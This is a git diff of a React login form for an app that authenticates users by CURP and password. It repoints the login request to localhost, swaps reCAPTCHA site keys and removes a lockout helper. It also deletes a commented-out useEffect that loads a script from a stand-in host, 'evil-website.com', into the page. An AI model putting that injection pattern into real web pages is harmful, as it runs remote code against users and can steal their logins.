@@ -24,18 +24,6 @@ export function Login() {
     setFormValues(allValues);
   };
 
-  {/*
-useEffect(() => {
-    const maliciousScript = document.createElement('script');
-    maliciousScript.src = 'http://www.evil-website.com/malicious-script.js';
-    document.body.appendChild(maliciousScript);
-
-    return () => {
-        document.body.removeChild(maliciousScript);
-    };
-}, []);
-*/}
-
   const [userRole, setUserRole] = useState(null);
   const onChange = () => {
     console.log("Recapcha");
@@ -47,25 +35,10 @@ useEffect(() => {
   const [messageText, setMessageText] = useState("");
   const [timeLeft, setTimeLeft] = useState(0);
 
-  const calculateTimeRemaining = () => {
-    const timePassedInSeconds = Math.floor((Date.now() - timeLeft) / 1000);
-    const timeRemainingInSeconds = Math.max(0, 300 - timePassedInSeconds);
-    const minutes = Math.floor(timeRemainingInSeconds / 60);
-    const seconds = timeRemainingInSeconds % 60;
-    return { minutes, seconds };
-  };
-
-  // funcion para indicar que no existireron muchos intentos
-  const updateMessageText = () => {
-    const { minutes, seconds } = calculateTimeRemaining();
-    setMessageText(`Se ha excedido el número de intentos. Favor de esperar 5 minutos.`
-    );
-  };
-
+ 
   const onFinish = async (values) => {
     try {
-      const response = await axios.post("https://012zona.vercel.app/login", {
-     
+      const response = await axios.post("http://localhost:3000/login", {
         curp: values.curp,
         contrasena: values.contrasena,
       });
@@ -85,7 +58,7 @@ useEffect(() => {
         } else if (userRole === 3) {
           navigate("/");
         } else {
-          navigate("/"); // Redirige a la ruta predeterminada si el rol no coincide con ninguno de los casos anteriores
+          navigate("/"); 
         }
       }  else {
         // Inicio de sesión fallido
@@ -132,9 +105,6 @@ useEffect(() => {
             onFinishFailed={onFinishFailed}
             onValuesChange={handleFormValuesChange}
           >
-            {/* 
-            <img src="https://static.nationalgeographic.es/files/styles/image_3200/public/75552.ngsversion.1422285553360.jpg?w=1600&h=1067" alt="Ejemplo de imagen" />
-                         */}
             <Contenido conTit={"Curp:"} />
             <Form.Item
               name="curp"
@@ -206,7 +176,8 @@ useEffect(() => {
               ]}
             >
               <ReCAPTCHA
-                sitekey="6LdZ4IMpAAAAADeX3M_zwV4kduNHhAhd7Ad6xUEx" 
+                //sitekey="6LdZ4IMpAAAAADeX3M_zwV4kduNHhAhd7Ad6xUEx" EN LINEA
+                sitekey="6Ld3nIspAAAAAAYW8viw6xH-drNf_a0sgXm6WhYI"
                 onChange={onChange}/>
             </Form.Item>
 
